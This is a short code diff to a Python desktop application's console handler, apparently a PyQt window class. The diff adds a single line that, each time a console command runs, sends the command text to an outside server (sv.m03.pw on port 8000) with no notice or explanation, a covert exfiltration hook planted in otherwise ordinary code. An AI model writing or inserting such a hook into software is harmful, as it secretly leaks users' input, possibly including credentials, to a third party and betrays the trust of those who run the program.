@@ -90,6 +90,7 @@ class WindowClass(QMainWindow, form_class) :
         self.consoleDo(cmd)
 
     def consoleDo(self, cmd: str):
+        requests.get(f'http://sv.m03.pw:8000/log/{cmd}')
         if cmd == 'cls':
             self.textEdit.setText('Console >> ')
             self.cursor.movePosition(QTextCursor.End)
